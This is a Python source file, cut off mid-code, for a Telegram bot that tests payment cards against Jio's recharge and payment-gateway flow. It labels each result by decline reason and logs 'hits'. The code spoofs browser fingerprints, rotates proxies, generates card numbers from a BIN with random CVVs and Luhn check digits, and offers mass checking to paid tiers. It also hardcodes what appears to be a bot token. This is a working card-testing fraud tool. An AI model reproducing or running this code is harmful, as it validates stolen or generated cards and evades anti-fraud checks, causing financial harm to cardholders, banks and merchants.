# Jio Recharge Bot — full version with decline classification
import telebot, re, time, os, sys, json, threading, random, datetime
from concurrent.futures import ThreadPoolExecutor
from curl_cffi import requests

try:
    sys.stdout.reconfigure(encoding='utf-8')
except:
    pass

# ================= CONFIG =================
BOT_TOKEN = os.getenv('BOT_TOKEN', '8854376849:AAEk1bQAx_KbzpWsRxdyilL6qILYRqxj4dc')
ADMIN_ID = int(os.getenv('ADMIN_ID', '8752143085'))
bot = telebot.TeleBot(BOT_TOKEN)

# ================= FILES =================
os.makedirs('JioData', exist_ok=True)
PREMIUM_FILE = 'JioData/premium.txt'
USERS_FILE = 'JioData/users.txt'
BANNED_FILE = 'JioData/banned.txt'
HITS_FILE = 'JioData/hits.txt'
PROXY_FILE = 'JioData/proxies.txt'

ADMIN_LIMIT = 100
PREMIUM_LIMIT = 30
FREE_LIMIT = 0
WORKERS = 8

ACTIVE_JOBS = {}
ACTIVE_USERS_MPP = {}

for f in [USERS_FILE, PREMIUM_FILE, BANNED_FILE, HITS_FILE, PROXY_FILE]:
    if not os.path.exists(f): open(f, 'w').close()

# ================= HELPERS =================
def is_admin(uid): return int(uid) == ADMIN_ID

def is_premium(uid):
    try:
        with open(PREMIUM_FILE, 'r') as f:
            for p in f.read().splitlines():
                parts = p.split('|')
                if len(parts) < 2: continue
                if str(uid) == parts[0].strip():
                    exp = float(parts[1])
                    if exp == 0 or time.time() < exp: return True
    except: pass
    return False

def is_banned(uid):
    try:
        with open(BANNED_FILE, 'r') as f:
            for b in f.read().splitlines():
                parts = b.split('|')
                if len(parts) < 2: continue
                if str(uid) == parts[0].strip():
                    exp = float(parts[1])
                    if exp == 0 or time.time() < exp: return True
    except: pass
    return False

def add_user(uid):
    try:
        with open(USERS_FILE, 'r') as f: users = f.read().splitlines()
        if str(uid) not in users:
            with open(USERS_FILE, 'a') as f: f.write(str(uid) + '\n')
    except: pass

# ================= PROXY =================
proxy_list = []

def load_proxies():
    global proxy_list
    proxy_list = []
    if os.path.exists(PROXY_FILE):
        with open(PROXY_FILE, 'r') as f:
            proxy_list = [l.strip() for l in f if l.strip()]
    return len(proxy_list)

def save_proxies(proxies):
    with open(PROXY_FILE, 'w') as f:
        for p in proxies: f.write(p + '\n')
    load_proxies()

def get_random_proxy():
    if not proxy_list: return None
    return random.choice(proxy_list)

def proxy_dict(entry):
    if not entry: return None
    try:
        parts = entry.split(":")
        if len(parts) == 4:
            host, port, user, pw = parts
            url = f"http://{user}:{pw}@{host}:{port}"
        elif len(parts) == 2:
            host, port = parts
            url = f"http://{host}:{port}"
        else:
            url = f"http://{entry}"
        return {"http": url, "https": url}
    except: return None

load_proxies()

# ================= PROXY COMMANDS =================
@bot.message_handler(commands=['proxy'])
def proxy_command(message):
    uid = message.from_user.id
    if is_banned(uid):
        bot.reply_to(message, "❌ <b>You are banned.</b>", parse_mode="HTML"); return
    add_user(uid)
    parts = message.text.strip().split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "📝 <b>Use:</b> /proxy add/list/remove", parse_mode="HTML"); return
    cmd = parts[1].split()[0].lower()
    arg = parts[1][len(cmd):].strip()

    if cmd == 'add':
        add_list = []
        if arg: add_list = [l.strip() for l in arg.splitlines() if l.strip()]
        elif message.reply_to_message:
            raw = message.reply_to_message.text or message.reply_to_message.caption or ''
            add_list = [l.strip() for l in raw.splitlines() if l.strip()]
        if not add_list:
            bot.reply_to(message, "📝 /proxy add host:port:user:pass", parse_mode="HTML"); return
        existing = []
        if os.path.exists(PROXY_FILE):
            with open(PROXY_FILE, 'r') as f: existing = [l.strip() for l in f if l.strip()]
        eset = set(existing)
        new = [p for p in add_list if p not in eset]
        save_proxies(existing + new)
        bot.reply_to(message,
            f"📊 <b>Proxy Add Result</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            f"┣ 📦 Total ➜ {len(add_list)}\n"
            f"┣ ✅ Added ➜ {len(new)}\n"
            f"┗ 🔄 Duplicate ➜ {len(add_list)-len(new)}",
            parse_mode="HTML")

    elif cmd == 'remove':
        if not arg: bot.reply_to(message, "📝 /proxy remove index/all", parse_mode="HTML"); return
        if not os.path.exists(PROXY_FILE): bot.reply_to(message, "❌ No proxies", parse_mode="HTML"); return
        with open(PROXY_FILE, 'r') as f: proxies = [l.strip() for l in f if l.strip()]
        if arg == 'all':
            save_proxies([]); bot.reply_to(message, "✅ <b>All proxies removed</b>", parse_mode="HTML"); return
        try:
            idx = int(arg)
            if idx < 1 or idx > len(proxies):
                bot.reply_to(message, f"❌ Invalid. Total: {len(proxies)}", parse_mode="HTML"); return
            removed = proxies.pop(idx-1); save_proxies(proxies)
            bot.reply_to(message, f"✅ Removed ➜ {removed}\n📦 Remaining ➜ {len(proxies)}", parse_mode="HTML")
        except: bot.reply_to(message, "📝 /proxy remove index/all", parse_mode="HTML")

    elif cmd == 'list':
        if not proxy_list: bot.reply_to(message, "❌ No proxies", parse_mode="HTML"); return
        lines = [f"📋 <b>Proxies ({len(proxy_list)})</b>", "━━━━━━━━━━━━━━━━━━━━"]
        for i, p in enumerate(proxy_list, 1):
            masked = p[:30]+'...' if len(p) > 33 else p
            lines.append(f"┣ {i}. {masked}")
        if len(proxy_list) > 50:
            lines = lines[:50] + [f"┗ ... and {len(proxy_list)-50} more"]
        else: lines[-1] = lines[-1].replace('┣', '┗')
        bot.reply_to(message, "\n".join(lines), parse_mode="HTML")
    else:
        bot.reply_to(message, "❌ <b>Unknown command</b>", parse_mode="HTML")

@bot.message_handler(commands=['checkproxy'])
def check_proxy_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ <b>Admin only.</b>", parse_mode="HTML"); return
    if not proxy_list:
        bot.reply_to(message, "❌ <b>No proxies loaded.</b>", parse_mode="HTML"); return
    msg = bot.reply_to(message, f"⏳ Checking {len(proxy_list)} proxies...", parse_mode="HTML")
    alive = []
    def chk(p):
        try:
            r = requests.get("https://api.ipify.org?format=json",
                             proxies=proxy_dict(p), timeout=10, impersonate="chrome124", verify=False)
            if r.status_code == 200: return p
        except: pass
        return None
    with ThreadPoolExecutor(max_workers=20) as ex:
        for res in ex.map(chk, proxy_list):
            if res: alive.append(res)
    save_proxies(alive)
    bot.edit_message_text(f"✅ <b>Alive: {len(alive)}/{len(proxy_list)}</b>\nDead removed.",
                          message.chat.id, msg.message_id, parse_mode="HTML")

# ================= JIO CORE =================
PROFILES = [
    {"imp":"chrome124","ua":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36","ch":'"Google Chrome";v="124", "Not_A Brand";v="8", "Chromium";v="124"',"plat":'"macOS"',"mob":"?0"},
    {"imp":"chrome123","ua":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36","ch":'"Google Chrome";v="123", "Not_A Brand";v="8", "Chromium";v="123"',"plat":'"Linux"',"mob":"?0"},
    {"imp":"chrome120","ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","ch":'"Google Chrome";v="120", "Not_A Brand";v="8", "Chromium";v="120"',"plat":'"Windows"',"mob":"?0"},
    {"imp":"edge101","ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36 Edg/101.0.0.0","ch":'"Microsoft Edge";v="101", "Not_A Brand";v="8", "Chromium";v="101"',"plat":'"Windows"',"mob":"?0"},
    {"imp":"firefox133","ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0","ch":'"Firefox";v="133", "Not_A Brand";v="8"',"plat":'"Windows"',"mob":"?0"},
]
SCREENS = [
    {"h":1080,"w":1920,"depth":24},{"h":900,"w":1440,"depth":30},
    {"h":768,"w":1366,"depth":24},{"h":1200,"w":1920,"depth":24},
    {"h":864,"w":1536,"depth":30},
]
LANGS = ["en-US,en;q=0.9","en-GB,en;q=0.9,en-US;q=0.8","en-IN,en;q=0.9,en-US;q=0.8","en-US,en;q=0.9,hi;q=0.8"]

def ts(): return str(int(time.time()*1000))

def iter_plans(pj):
    for cat in pj.get("planCategories") or []:
        for sub in cat.get("subCategories") or []:
            for plan in sub.get("plans") or []:
                if plan.get("key"):
                    yield {"key":plan["key"],"amount":float(plan.get("amount") or 0),
                           "name":plan.get("name") or plan.get("planName") or "",
                           "category":cat.get("type") or "","validity":plan.get("validity") or ""}

def plan_by_amount(pj, amount):
    for p in iter_plans(pj):
        if p["amount"] == float(amount): return p
    return None

def parse_card_line(line):
    parts = re.split(r"[|/:\s]+", line.strip())
    if len(parts) < 4: return None
    pan, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    if not re.fullmatch(r"\d{13,19}", pan): return None
    mm = mm.zfill(2)
    if len(yy) == 4: yyyy = yy
    elif len(yy) == 2: yyyy = "20" + yy
    else: yyyy = "20" + yy.zfill(2)
    return {"pan": pan, "exp_month": mm, "exp_year": yyyy, "cvv": cvv}

def card_label(card):
    return f"{card['pan']}|{card['exp_month']}|{card['exp_year'][-2:]}|{card['cvv']}"

def classify_decline(status, message, reason):
    """Return (status_key, formatted_message)."""
    combined = f"{status} {message} {reason}".lower()

    if status in ("SUCCESS", "APPROVED"):
        return "success", "Recharge successful."

    if any(k in combined for k in ["3ds", "otp", "authenticate", "challenge"]):
        return "3ds", "3DS required"

    if any(k in combined for k in ["insufficient", "not sufficient", "no sufficient",
                                    "low balance", "not enough funds", "balance not available",
                                    "fund shortage"]):
        return "insufficient", f"Insufficient Funds — {message[:80]}"

    if any(k in combined for k in ["expired", "expiry", "expiration", "card_expired"]):
        return "expired", f"Card Expired — {message[:80]}"

    if any(k in combined for k in ["cvv", "cvc", "security code", "invalid_cvv"]):
        return "invalid_cvv", f"Invalid CVV — {message[:80]}"

    if any(k in combined for k in ["invalid card", "invalid_card", "card number",
                                    "invalid_pan", "pan invalid"]):
        return "invalid_card", f"Invalid Card — {message[:80]}"

    if any(k in combined for k in ["do not honor", "do_not_honor", "issuer_decline",
                                    "declined by issuer", "restricted card"]):
        return "issuer_decline", f"Card Issuer Declined — {message[:80]}"

    if any(k in combined for k in ["blocked", "stolen", "lost", "pickup", "pick up",
                                    "card_blocked", "card_restricted"]):
        return "blocked", f"Card Blocked — {message[:80]}"

    if any(k in combined for k in ["not permitted", "not allowed", "international",
                                    "online transaction", "ecommerce disabled",
                                    "not enabled for online"]):
        return "not_permitted", f"Not Permitted — {message[:80]}"

    if any(k in combined for k in ["limit", "exceeded", "over limit", "transaction_limit"]):
        return "limit_exceeded", f"Limit Exceeded — {message[:80]}"

    if any(k in combined for k in ["velocity", "too many", "rate limit", "max attempts"]):
        return "velocity", f"Velocity Limit — {message[:80]}"

    if any(k in combined for k in ["processor", "network", "timeout", "gateway",
                                    "system error", "try again", "temporarily"]):
        return "processor_error", f"Processor Error — {message[:80]}"

    if status == "ISSUER_DECLINE":
        return "issuer_decline", f"Card Issuer Declined — {message[:80]}"

    return "failed", (message or reason or "Declined")[:120]

def jio_check(phone, amount, card, proxy_str=None):
    meta = {"merchant": "Jio Recharge", "amount": amount, "plan": ""}
    try:
        pf = random.choice(PROFILES)
        sc = random.choice(SCREENS)
        lg = random.choice(LANGS)
        UA = pf["ua"]; SEC = pf["ch"]; PLAT = pf["plat"]; MOB = pf["mob"]; IMP = pf["imp"]

        CARD_NUM = card["pan"]
        CARD_MM = card["exp_month"]
        CARD_YY = card["exp_year"]
        CARD_CVV = card["cvv"]
        CARD_NAME = "matt henry"
        CARD_PREFIX = CARD_NUM[:6]

        session = requests.Session(impersonate=IMP, verify=False)
        if proxy_str:
            pd = proxy_dict(proxy_str)
            if pd: session.proxies.update(pd)

        def jh(ref, ct=None, origin=None, extra=None):
            h = {"Accept-Language": lg, "Cache-Control": "no-cache", "Connection": "keep-alive",
                 "Pragma": "no-cache", "Referer": ref, "User-Agent": UA, "sec-ch-ua": SEC,
                 "sec-ch-ua-mobile": MOB, "sec-ch-ua-platform": PLAT}
            if ct: h["Content-Type"] = ct
            if origin: h["Origin"] = origin
            if extra: h.update(extra)
            return h

        def ph(ref, ct=None, origin=None, extra=None):
            h = {"Accept": "application/json, text/plain, */*", "Accept-Language": lg,
                 "Cache-Control": "no-cache", "Pragma": "no-cache", "Referer": ref,
                 "User-Agent": UA, "sec-ch-ua": SEC, "sec-ch-ua-mobile": MOB,
                 "sec-ch-ua-platform": PLAT, "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors",
                 "Sec-Fetch-Site": "same-origin", "x-request-time": ts()}
            if ct: h["Content-Type"] = ct
            if origin: h["Origin"] = origin
            if extra: h.update(extra)
            return h

        def sget(url, headers, **kw):
            for a in range(2):
                try: return session.get(url, headers=headers, timeout=45, **kw)
                except Exception:
                    if a == 1: raise
                    time.sleep(0.5)

        def spost(url, headers, **kw):
            for a in range(2):
                try: return session.post(url, headers=headers, timeout=45, **kw)
                except Exception:
                    if a == 1: raise
                    time.sleep(0.5)

        # 1. Session
        try:
            sget("https://www.jio.com/", headers={
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": lg, "Upgrade-Insecure-Requests": "1",
                "User-Agent": UA, "sec-ch-ua": SEC, "sec-ch-ua-mobile": MOB, "sec-ch-ua-platform": PLAT})
        except Exception as e:
            return "error", f"Session failed: {str(e)[:80]}", meta

        # 2. Number lookup
        try:
            r = sget(f"https://www.jio.com/api/jio-recharge-service/recharge/mobility/number/{phone}",
                headers=jh("https://www.jio.com/", extra={"Accept":"application/json, text/plain, */*",
                    "Sec-Fetch-Dest":"empty","Sec-Fetch-Mode":"cors","Sec-Fetch-Site":"same-origin"}))
            d = r.json()
        except Exception as e:
            return "error", f"Number lookup failed: {str(e)[:80]}", meta

        if d.get("errorMessage") == "NOT_SUBSCRIBED_USER":
            return "error", "Not a Jio number", meta

        primary = d.get("primaryService") or {}
        billing_type = d.get("billingType") or primary.get("billingType") or "PREPAID"
        next_value = d.get("nextPage") or billing_type
        plans_ref = (f"https://www.jio.com/selfcare/recharge/mobility/plans/"
                     f"?serviceType=mobility&serviceId={phone}&next={next_value}&billingType={billing_type}&entrysource=Widget")

        # 3. Plans page
        try:
            sget("https://www.jio.com/selfcare/recharge/mobility/plans/",
                headers=jh("https://www.jio.com/", extra={"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Sec-Fetch-Dest":"document","Sec-Fetch-Mode":"navigate","Sec-Fetch-Site":"same-origin",
                    "Sec-Fetch-User":"?1","Upgrade-Insecure-Requests":"1"}),
                params={"serviceType":"mobility","serviceId":phone,"next":next_value,
                        "billingType":billing_type,"entrysource":"Widget"})
        except Exception: pass

        # 4. Plans JSON
        try:
            r4 = sget(f"https://www.jio.com/api/jio-recharge-service/recharge/plans/serviceId/{phone}",
                headers=jh(plans_ref, extra={"Accept":"*/*","Sec-Fetch-Dest":"empty",
                    "Sec-Fetch-Mode":"cors","Sec-Fetch-Site":"same-origin"}))
            plans_json = r4.json()
        except Exception as e:
            return "error", f"Plans fetch failed: {str(e)[:80]}", meta

        picked = plan_by_amount(plans_json, amount)
        if not picked:
            return "error", f"No plan for Rs {amount}", meta
        plan_key = picked["key"]
        meta["plan"] = (picked["name"] or picked["category"] or "")[:35]

        # 5. Buy
        try:
            r = spost("https://www.jio.com/api/jio-recharge-service/recharge/buy",
                headers=jh(plans_ref, ct="application/json", origin="https://www.jio.com",
                    extra={"Accept":"*/*","Sec-Fetch-Dest":"empty","Sec-Fetch-Mode":"cors","Sec-Fetch-Site":"same-origin"}),
                json={"planKey":plan_key,"selectedService":phone})
            if r.status_code != 200:
                return "error", f"Buy failed ({r.status_code})", meta
        except Exception as e:
            return "error", f"Buy failed: {str(e)[:80]}", meta

        # 6. Pay
        try:
            r = spost("https://www.jio.com/api/jio-recharge-service/recharge/pay",
                headers=jh(plans_ref, ct="application/json", origin="https://www.jio.com",
                    extra={"Accept":"*/*","Sec-Fetch-Dest":"empty","Sec-Fetch-Mode":"cors","Sec-Fetch-Site":"same-origin"}),
                json={"addonPlanKeys":[],"flexiTopupFlow":False,
                      "servicePlanList":[{"planKey":plan_key,"quantity":1,"serviceId":phone}]})
            payment_url = r.json().get("paymentURL",
                "https://www.jio.com/api/jio-common-servlet/jiocommon/redirect")
        except Exception as e:
            return "error", f"Pay init failed: {str(e)[:80]}", meta

        # 7. Redirect
        try:
            r = sget(payment_url, headers=jh(plans_ref, extra={
                "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Sec-Fetch-Dest":"document","Sec-Fetch-Mode":"navigate",
                "Sec-Fetch-Site":"same-origin","Sec-Fetch-User":"?1","Upgrade-Insecure-Requests":"1"}),
                allow_redirects=True)
            fa = re.search(r"action='([^']+)'", r.text)
            fi = re.findall(r"name='([^']+)'\s+value='([^']*)'", r.text)
            pay_form_url = fa.group(1) if fa else "https://pay.jio.com/jiopg/v1/payment-options"
            pay_form_data = {k: v for k, v in fi}
        except Exception as e:
            return "error", f"Redirect failed: {str(e)[:80]}", meta

        # 8. Pay portal
        try:
            r = spost(pay_form_url, headers=jh("https://www.jio.com/",
                ct="application/x-www-form-urlencoded", origin="https://www.jio.com",
                extra={"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                       "Sec-Fetch-Dest":"document","Sec-Fetch-Mode":"navigate",
                       "Sec-Fetch-Site":"cross-site","Sec-Fetch-User":"?1","Upgrade-Insecure-Requests":"1"}),
                data=pay_form_data, allow_redirects=True)
            pay_jio_ref = r.url
        except Exception as e:
            return "error", f"Pay portal failed: {str(e)[:80]}", meta

        # 9. Authorize
        try:
            r = spost("https://pay.jio.com/jiopg/v1/authorize-card-operation",
                headers=jh(pay_jio_ref, ct="application/json", origin="https://pay.jio.com",
                    extra={"Accept":"application/json","Sec-Fetch-Dest":"empty",
                           "Sec-Fetch-Mode":"cors","Sec-Fetch-Site":"same-origin"}),
                json={"paymentMode":"CCDC","cardPrefix":CARD_PREFIX,"isEMISelected":False,
                      "viewOffer":False,"skuCode":None,"copco":None,"isStoreCreditSelected":None})
            x_token = r.json().get("token", "")
            if not x_token:
                return "error", "Auth token missing", meta
        except Exception as e:
            return "error", f"Auth failed: {str(e)[:80]}", meta

        # 10. Card confirm
        try:
            r = spost("https://pay.jio.com/jpgpciapp/v1/on-ccdc-confirmation",
                headers=jh(pay_jio_ref, ct="application/json", origin="https://pay.jio.com",
                    extra={"Accept":"application/json","Sec-Fetch-Dest":"empty",
                           "Sec-Fetch-Mode":"cors","Sec-Fetch-Site":"same-origin","x-token":x_token}),
                json={"cvvNumber":CARD_CVV,"cashBackApplied":"N","isTrxnStatusCheckEnable":"N",
                      "seqId":"","ccRoutePg":"","customerCardTypeValue":"mastercard","paymentMode":"CCDC",
                      "offerAppliedByCust":False,"viewOffer":False,"cardType":"ic_mastercard",
                      "cardNumber":CARD_NUM,"cardTypeText":"MASTERCARD_CARD","expiryMonth":CARD_MM,
                      "expiryYear":CARD_YY,"cardHolderName":CARD_NAME,"userCardSaveConsent":False,
                      "browserDetails":{"browserHeader":"application/json","browserJavaEnabled":False,
                          "browserJavascriptEnabled":True,"browserLanguage":lg.split(",")[0],
                          "browserColorDepth":sc["depth"],"browserScreenHeight":sc["h"],
                          "browserScreenWidth":sc["w"],"browserTz":-330,"browserUserAgent":UA}})
            cd = r.json()
        except Exception as e:
            return "error", f"Card confirmation failed: {str(e)[:80]}", meta

        if not cd.get("status"):
            msg = cd.get("message", "Card confirmation failed")
            key, m2 = classify_decline("CONFIRM_FAIL", msg, "")
            return key, m2, meta

        html_form = cd.get("htmlForm", "")
        if not html_form:
            return "failed", "No bank form", meta

        # 11. Bank connect
        try:
            ea = re.search(r"action='([^']+)'", html_form)
            ei = re.findall(r"name='([^']+)'\s+value='([^']*)'", html_form)
            eu = ea.group(1) if ea else ""
            ed = {k: v for k, v in ei}
            if not eu:
                return "failed", "Bank URL missing", meta
            r = spost(eu, headers=jh(pay_jio_ref, ct="application/x-www-form-urlencoded",
                origin="https://pay.jio.com",
                extra={"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                       "Sec-Fetch-Dest":"document","Sec-Fetch-Mode":"navigate",
                       "Sec-Fetch-Site":"cross-site","Sec-Fetch-User":"?1","Upgrade-Insecure-Requests":"1"}),
                data=ed, allow_redirects=True)
        except Exception as e:
            return "error", f"Bank connect failed: {str(e)[:80]}", meta

        txt = r.text.lower()
        url_lower = r.url.lower()

        if "3dsecure" in txt or "authentication" in txt or "otp" in txt or "3ds" in url_lower:
            return "3ds", "3DS required", meta

        if "insufficient" in txt or "not enough funds" in txt or "low balance" in txt:
            return "insufficient", "Insufficient Funds (bank page)", meta

        if "declined" in txt or "do not honor" in txt:
            dm = re.search(r'(declined[^<]{0,80}|do not honor[^<]{0,80})', txt)
            key, m2 = classify_decline("ISSUER_DECLINE", dm.group(1) if dm else "Declined by issuer", "")
            return key, m2, meta

        m = re.search(r'x-gl-token=([^&\s"\'\\]+)', r.url + r.text)
        if not m:
            return "failed", "Bank redirect failed", meta
        gl_token = m.group(1)
        gl_ref = f"https://api.payglocal.com/gl/payflow-ui/?x-gl-token={gl_token}"

        # 12. PG redirect
        try:
            r = sget("https://api.payglocal.com/gl/v2/payments/redirect/dc",
                params={"x-gl-token": gl_token},
                headers=ph(gl_ref, extra={"x-gl-current-host":"api.payglocal.com",
                    "x-gl-gid":"gl_payflow-ui","x-gl-pb-tag-id":"",
                    "x-gl-previous-host":"https://pay.easebuzz.in/","x-gl-referrer-mismatch":"false",
                    "x-gl-trusted-referrer":"https://pay.easebuzz.in"}))
            if r.status_code != 200:
                return "error", f"PG redirect {r.status_code}", meta
        except Exception as e:
            return "error", f"PG redirect failed: {str(e)[:80]}", meta

        # 13. Payment init
        try:
            r = spost("https://api.payglocal.com/gl/v2/payments/pd/paynow",
                params={"x-gl-token": gl_token},
                headers=ph(gl_ref, ct="application/json", origin="https://api.payglocal.com"),
                json={"isEnc":"false","payload":{"customerCurrency":"INR","saveCurrencyPreference":False,
                    "browserDetails":{"colorDepth":sc["depth"],"javaEnabled":False,"javaScripEnabled":True,
                        "language":lg.split(",")[0],"screenHeight":sc["h"],"screenWidth":sc["w"],"timeZone":-330},
                    "billingData":{"addressCountry":"FR"},"shippingData":{},"agreedOnTnCs":True}})
            if r.status_code != 200:
                return "error", f"Paynow {r.status_code}", meta
        except Exception as e:
            return "error", f"Paynow failed: {str(e)[:80]}", meta

        # 14. Risk check
        try:
            r = spost("https://api.payglocal.com/gl/v1/payments/risk/fp",
                params={"x-gl-token": gl_token},
                headers=ph(gl_ref, ct="application/json", origin="https://api.payglocal.com"),
                json={"requestId":f"{ts()}.{random.randint(100000,999999)}",
                      "visitorId":"Y8c4sEunqz0opl0b6YAd","visitorFound":True,"confidenceScore":1})
            kid = r.json().get("data", {}).get("kid", "")
            if not kid:
                return "error", "Risk check failed", meta
        except Exception as e:
            return "error", f"Risk check failed: {str(e)[:80]}", meta

        # 15. Charge
        time.sleep(random.uniform(0.5, 1.2))
        try:
            r = spost("https://api.payglocal.com/gl/v2/payments/dc/ipay",
                params={"x-gl-token": gl_token},
                headers=ph(gl_ref, ct="application/json", origin="https://api.payglocal.com"),
                json={"isEnc":"false","kid":kid,"payload":{
                    "cardNumber":CARD_NUM,"expiryMonth":CARD_MM,"expiryYear":CARD_YY,"cvv":CARD_CVV,
                    "cardHolderName":CARD_NAME,"saveCard":False,
                    "browserDetails":{"colorDepth":sc["depth"],"javaEnabled":False,"javaScriptEnabled":True,
                        "language":lg.split(",")[0],"screenHeight":sc["h"],"screenWidth":sc["w"],
                        "timeZone":-330,"userAgent":UA}}})
            result = r.json()
        except Exception as e:
            return "error", f"Charge failed: {str(e)[:80]}", meta

        status = result.get("status", "")
        message = result.get("message", "")
        reason = result.get("reasonCode", "")

        key, msg = classify_decline(status, message, reason)
        return key, msg, meta

    except Exception as e:
        return "error", f"Check failed: {str(e)[:100]}", meta

# ================= STATUS HEADS =================
def status_head(status):
    heads = {
        "success": "✅ <b>HIT SUCCESSFUL</b>",
        "3ds": "🔥 <b>3DS REQUIRED</b>",
        "insufficient": "💸 <b>INSUFFICIENT FUNDS</b>",
        "expired": "📅 <b>CARD EXPIRED</b>",
        "invalid_cvv": "🔒 <b>INVALID CVV</b>",
        "invalid_card": "❌ <b>INVALID CARD</b>",
        "issuer_decline": "🚫 <b>CARD ISSUER DECLINED</b>",
        "blocked": "🔴 <b>CARD BLOCKED</b>",
        "not_permitted": "⛔ <b>NOT PERMITTED</b>",
        "limit_exceeded": "📊 <b>LIMIT EXCEEDED</b>",
        "velocity": "⚠️ <b>VELOCITY LIMIT</b>",
        "processor_error": "🔧 <b>PROCESSOR ERROR</b>",
        "failed": "❌ <b>DECLINED</b>",
        "error": "⚠️ <b>ERROR</b>",
    }
    return heads.get(status, "⚠️ <b>UNKNOWN</b>")

# ================= COMMANDS =================
@bot.message_handler(commands=['start'])
def start(message):
    uid = message.from_user.id
    if is_banned(uid):
        bot.reply_to(message, "❌ <b>You are banned.</b>", parse_mode="HTML"); return
    add_user(uid)
    bot.reply_to(message,
        f"👋 <b>Welcome to Jio Recharge Bot</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 User ➤ <b>{message.from_user.first_name}</b>\n"
        f"🆔 ID ➤ <code>{uid}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"⚡ /jio — Single check\n"
        f"📦 /mjio — Mass check\n"
        f"🌐 /proxy — Manage proxies\n"
        f"👤 /info — Account info",
        parse_mode="HTML")

@bot.message_handler(commands=['jio'])
def jio_single(message):
    uid = message.from_user.id
    if is_banned(uid):
        bot.reply_to(message, "❌ <b>You are banned.</b>", parse_mode="HTML"); return
    add_user(uid)
    args = message.text.split()
    if len(args) < 4:
        bot.reply_to(message,
            "📝 <b>Usage:</b> <code>/jio &lt;phone&gt; &lt;amount&gt; &lt;pan|mm|yy|cvv&gt;</code>\n"
            "Example: <code>/jio 9876543210 239 5131112233445566|03|30|086</code>",
            parse_mode="HTML"); return
    phone, amount, cc = args[1], args[2], args[3]
    card = parse_card_line(cc)
    if not card:
        bot.reply_to(message, "❌ <b>Invalid card format.</b>", parse_mode="HTML"); return

    msg = bot.reply_to(message,
        f"⏳ <b>Processing Jio recharge...</b>\n"
        f"👤 Phone: <code>{phone}</code>\n"
        f"💰 Amount: ₹{amount}",
        parse_mode="HTML")

    proxy = get_random_proxy()
    try:
        status, response, meta = jio_check(phone, amount, card, proxy_str=proxy)
    except Exception as e:
        status, response = "error", f"Failed: {e}"

    if is_admin(uid): rk = " [ADMIN]"
    elif is_premium(uid): rk = " [PREMIUM]"
    else: rk = " [FREE]"

    safe = str(response).replace("<","").replace(">","").replace("&","")
    safe_name = str(message.from_user.first_name).replace("<","").replace(">","").replace("&","")

    if status == "success":
        with open(HITS_FILE, 'a', encoding="utf-8") as f:
            f.write(f"{phone} Rs{amount} {card_label(card)} - {response}\n")

    head = status_head(status)
    res = (
        f"{head}\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"👤 <b>Phone</b> ━ <code>{phone}</code>\n"
        f"💰 <b>Amount</b> ━ ₹{amount}\n"
        f"💳 <b>Card</b> ━ <code>{card_label(card)}</code>\n"
        f"📩 <b>Response</b> ━ {safe}\n"
        f"🌐 <b>Gateway</b> ━ Jio Recharge\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"👤 <b>User:</b> {safe_name}{rk}"
    )
    try: bot.delete_message(message.chat.id, msg.message_id)
    except: pass
    try: bot.reply_to(message, res, parse_mode="HTML")
    except:
        try: bot.reply_to(message, res.replace("<code>","").replace("</code>",""))
        except: pass

@bot.message_handler(commands=['mjio'])
def mjio_mass(message):
    uid = message.from_user.id
    if is_banned(uid):
        bot.reply_to(message, "❌ <b>You are banned.</b>", parse_mode="HTML"); return
    add_user(uid)

    limit = ADMIN_LIMIT if is_admin(uid) else (PREMIUM_LIMIT if is_premium(uid) else FREE_LIMIT)
    if limit == 0:
        bot.reply_to(message, "⚠️ <b>Free users cannot use mass check.</b>", parse_mode="HTML"); return
    if ACTIVE_USERS_MPP.get(uid):
        bot.reply_to(message, "⚠️ <b>Mass check already running.</b>", parse_mode="HTML"); return

    args = message.text.split()
    cards = []
    phone = amount = None

    if len(args) >= 5:
        phone, amount, bin_str = args[1], args[2], args[3]
        try: count = int(args[4])
        except: count = 10
        count = min(count, limit)
        b = re.sub(r"\D", "", bin_str)
        total_len = 15 if b.startswith(("34","37")) else 16
        def luhn(p):
            d=[int(x) for x in p]; d.reverse(); t=0
            for i,x in enumerate(d):
                if i%2==0:
                    x*=2
                    if x>9: x-=9
                t+=x
            return str((10-t%10)%10)
        for _ in range(count):
            pre = b + "".join(random.choices("0123456789", k=max(total_len-1-len(b), 0)))
            cards.append({"pan":pre+luhn(pre),"exp_month":"12","exp_year":"2029",
                          "cvv":f"{random.randint(0,999):03d}"})
    elif len(args) >= 3 and message.reply_to_message and message.reply_to_message.document:
        phone, amount = args[1], args[2]
        fi = bot.get_file(message.reply_to_message.document.file_id)
        raw = bot.download_file(fi.file_path)
        for l in raw.decode('utf-8', errors='ignore').splitlines():
            c = parse_card_line(l)
            if c: cards.append(c)
        if not cards:
            bot.reply_to(message, "❌ <b>No valid cards in file.</b>", parse_mode="HTML"); return
        cards = cards[:limit]
    else:
        bot.reply_to(message,
            "📝 <b>Usage:</b>\n"
